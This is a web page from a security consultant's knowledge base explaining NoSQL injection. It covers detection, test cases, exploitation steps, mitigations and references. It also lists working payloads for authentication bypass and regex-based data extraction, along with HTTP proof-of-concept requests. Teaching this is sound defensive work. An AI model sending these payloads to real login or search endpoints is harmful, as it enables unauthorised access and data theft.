@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NoSQL Injection | Web Security | Saikumar Raju</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    :root { --primary: #00f5a0; --bg-dark: #0a0c10; --bg-card: #111827; --bg-elevated: #1a1f2e; --text-primary: #e8edf5; --text-secondary: #9ca3af; --border: #1f2937; }
+    body.light { --bg-dark: #f3f4f6; --bg-card: #ffffff; --bg-elevated: #e5e7eb; --text-primary: #111827; --text-secondary: #4b5563; --border: #d1d5db; }
+    body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: var(--text-primary); line-height: 1.6; transition: all 0.3s ease; }
+    .container { max-width: 1300px; margin: 0 auto; padding: 0 2rem; }
+    .navbar { position: sticky; top: 0; background: var(--bg-dark); border-bottom: 1px solid var(--border); padding: 1rem 0; z-index: 100; backdrop-filter: blur(8px); }
+    .nav-flex { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+    .logo { font-size: 1.5rem; font-weight: 700; text-decoration: none; color: var(--text-primary); }
+    .logo span { color: var(--primary); }
+    .nav-links { display: flex; gap: 2rem; list-style: none; align-items: center; flex-wrap: wrap; }
+    .nav-links a { text-decoration: none; color: var(--text-secondary); font-weight: 500; transition: color 0.2s; }
+    .nav-links a:hover { color: var(--primary); }
+    .theme-toggle { background: var(--bg-elevated); border: none; padding: 0.4rem 1rem; border-radius: 40px; cursor: pointer; color: var(--text-primary); display: flex; align-items: center; gap: 0.5rem; font-family: inherit; }
+    .mobile-menu { display: none; background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer; }
+    .page-header { padding: 6rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .page-header h1 { font-size: 2.5rem; font-weight: 700; margin-bottom: 0.5rem; }
+    .severity-badge { display: inline-block; background: rgba(255, 68, 68, 0.2); color: #ff4444; padding: 0.3rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.5rem; margin: 1.5rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
+    .content-section h3 { font-size: 1.2rem; margin: 1rem 0 0.5rem; }
+    .content-section p { margin-bottom: 1rem; color: var(--text-secondary); }
+    .content-section ul, .content-section ol { margin: 1rem 0 1.5rem 2rem; color: var(--text-secondary); }
+    .content-section li { margin-bottom: 0.5rem; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85rem; color: var(--primary); position: relative; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: none; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.7rem; }
+    .copy-btn:hover { color: var(--primary); }
+    .payload-category { margin: 1.5rem 0 1rem; padding: 0.5rem; background: var(--bg-elevated); border-radius: 8px; font-weight: 700; color: var(--primary); }
+    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 0.8rem; margin: 1rem 0; }
+    .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.7rem; font-family: monospace; font-size: 0.75rem; word-break: break-all; }
+    .vulnerability-box { background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.8rem; }
+    .test-cases { width: 100%; border-collapse: collapse; background: var(--bg-card); border: 1px solid var(--border); margin: 1rem 0; }
+    .test-cases th, .test-cases td { padding: 0.75rem; text-align: left; border-bottom: 1px solid var(--border); }
+    .test-cases th { background: var(--bg-elevated); color: var(--primary); }
+    @media (max-width: 768px) {
+      .container { padding: 0 1rem; }
+      .mobile-menu { display: block; }
+      .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; }
+      .nav-links.show { display: flex; }
+      .page-header h1 { font-size: 1.8rem; }
+      .payload-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar.<span>Raju</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Resume</a></li>
+      <li><a href="../knowledge-base.html">Knowledge Base</a></li>
+      <li><a href="../blog.html">Write-ups</a></li>
+      <li><a href="../tools.html">Tools</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> Dark</button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / NoSQL Injection</div>
+    <div class="page-header">
+      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> Critical Severity</span>
+      <h1>📌 NoSQL Injection</h1>
+    </div>
+
+    <div class="content-section">
+      <h2>🧠 Description</h2>
+      <p><strong>What is NoSQL Injection?</strong></p>
+      <p>NoSQL databases (MongoDB, CouchDB, Redis, etc.) use JSON‑style queries instead of SQL. They have special operators like <code>$ne</code> (not equal), <code>$gt</code> (greater than), <code>$regex</code> (pattern match), and <code>$where</code> (JavaScript execution). If an application passes user input directly into a NoSQL query without sanitisation, an attacker can inject these operators to bypass authentication, extract data, or even execute arbitrary code.</p>
+      <p><strong>Security principle violated:</strong> Input Validation</p>
+    </div>
+
+    <div class="content-section">
+      <h2>🏷️ Classification</h2>
+      <ul>
+        <li><strong>Type:</strong> Injection</li>
+        <li><strong>OWASP:</strong> A03:2021 – Injection</li>
+        <li><strong>CWE:</strong> CWE-943: Improper Neutralization of Special Elements in Data Query Logic</li>
+      </ul>
+    </div>
+
+    <div class="content-section">
+      <h2>🎯 Attack Surface</h2>
+      <ul>
+        <li>✅ Login forms (JSON body, URL parameters)</li>
+        <li>✅ Search/filter endpoints with JSON input</li>
+        <li>✅ API endpoints accepting <code>application/json</code></li>
+        <li>✅ GraphQL queries</li>
+      </ul>
+    </div>
+
+    <div class="content-section">
+      <h2>🔍 Detection Methodology</h2>
+      <h3>1. Static Analysis</h3>
+      <p>Look for MongoDB queries using user input without validation, e.g., <code>db.collection.find({username: req.body.username})</code>.</p>
+      <h3>2. Dynamic Analysis</h3>
+      <ul>
+        <li>Change a login request from <code>{"username":"admin","password":"pass"}</code> to <code>{"username":"admin","password":{"$ne":""}}</code></li>
+        <li>If you log in without a real password, NoSQL injection is confirmed.</li>
+      </ul>
+    </div>
+
+    <div class="content-section">
+      <h2>💣 Basic Payloads</h2>
+      <div class="payload-grid">
+        <div class="payload-item">{"$ne": ""}</div>
+        <div class="payload-item">{"$gt": ""}</div>
+        <div class="payload-item">{"$regex": ".*"}</div>
+        <div class="payload-item">{"$where": "1==1"}</div>
+        <div class="payload-item">{"$or": []}</div>
+        <div class="payload-item">{"$nin": []}</div>
+      </div>
+
+      <div class="payload-category">🔐 Authentication Bypass</div>
+      <div class="payload-grid">
+        <div class="payload-item">{"username": "admin", "password": {"$ne": ""}}</div>
+        <div class="payload-item">{"username": {"$ne": null}, "password": {"$ne": null}}</div>
+        <div class="payload-item">{"username": "admin", "password": {"$regex": "^.*"}}</div>
+      </div>
+
+      <div class="payload-category">📊 Data Extraction (Boolean)</div>
+      <div class="payload-grid">
+        <div class="payload-item">{"username": "admin", "password": {"$regex": "^a"}}</div>
+        <div class="payload-item">{"username": "admin", "password": {"$regex": "^a.*"}}</div>
+        <div class="payload-item">{"$where": "this.password.match(/^a/)"}</div>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>🧪 Test Cases (STRICT)</h2>
+      <table class="test-cases">
+        <thead><tr><th>Step</th><th>Action</th><th>Expected</th><th>Actual</th></tr></thead>
+        <tbody>
+          <tr><td style="padding: 0.75rem;">1</td><td style="padding: 0.75rem;">Send <code>{"password":{"$ne":""}}</code> with any username</td><td style="padding: 0.75rem;">Login rejected</td><td style="padding: 0.75rem;">Successful login</td></tr>
+          <tr><td style="padding: 0.75rem;">2</td><td style="padding: 0.75rem;">Send <code>{"$where":"1==1"}</code> in search</td><td style="padding: 0.75rem;">No results</td><td style="padding: 0.75rem;">All records returned</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="content-section">
+      <h2>⚙️ Exploitation Steps</h2>
+      <ol>
+        <li>Identify endpoints that accept JSON input (check <code>Content-Type: application/json</code>).</li>
+        <li>Modify a login request: replace the password value with <code>{"$ne": ""}</code>.</li>
+        <li>If login succeeds, authentication bypass is confirmed.</li>
+        <li>Use <code>$regex</code> payloads to brute‑force character by character (similar to blind SQL injection).</li>
+        <li>Extract full database contents using automated tools like NoSQLMap.</li>
+      </ol>
+    </div>
+
+    <div class="content-section">
+      <h2>🛡️ Mitigation</h2>
+      <div class="mitigation-box">
+        <strong>✅ Use parameterised queries (MongoDB drivers support typed parameters)</strong><br>
+        <strong>✅ Validate and sanitise all user input – reject operator keys (<code>$ne</code>, <code>$gt</code>, etc.)</strong><br>
+        <strong>✅ Use schema validation to restrict allowed fields</strong><br>
+        <strong>✅ Apply least privilege database accounts</strong>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>⚠️ Risk / Impact</h2>
+      <div class="vulnerability-box">
+        <strong>Severity: Critical</strong><br><br>
+        <strong>Impact:</strong> Authentication bypass, unauthorised data access, data manipulation, potential RCE via <code>$where</code> (if JavaScript execution is enabled).
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>📎 Proof of Concept (PoC)</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Authentication bypass (MongoDB login)
+POST /login HTTP/1.1
+Content-Type: application/json
+
+{"username": "admin", "password": {"$ne": ""}}
+
+# Data extraction using regex
+POST /search HTTP/1.1
+Content-Type: application/json
+
+{"username": {"$regex": "^admin"}, "role": "user"}</pre>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://portswigger.net/web-security/nosql-injection" class="reference-link" target="_blank" style="color: var(--primary);">PortSwigger – NoSQL Injection</a></li>
+        <li><a href="https://github.com/cr0hn/nosqlinjection_wordlists" class="reference-link" target="_blank" style="color: var(--primary);">NoSQL Injection Wordlists</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
+  </div>
+</main>
+
+<footer><p>Saikumar Raju — Cybersecurity Consultant | NoSQL Injection Guide</p></footer>
+
+<script>
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
+  const themeToggle = document.getElementById('themeToggle'); if (themeToggle) { themeToggle.addEventListener('click', () => { document.body.classList.toggle('light'); const icon = themeToggle.querySelector('i'); if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light'; } else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); themeToggle.innerHTML = '<i class="fas fa-moon"></i> Dark'; } }); }
+  function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.innerText = 'Copied!'; setTimeout(() => { btn.innerText = 'Copy'; }, 2000); }
+</script>
+</body>
+</html>
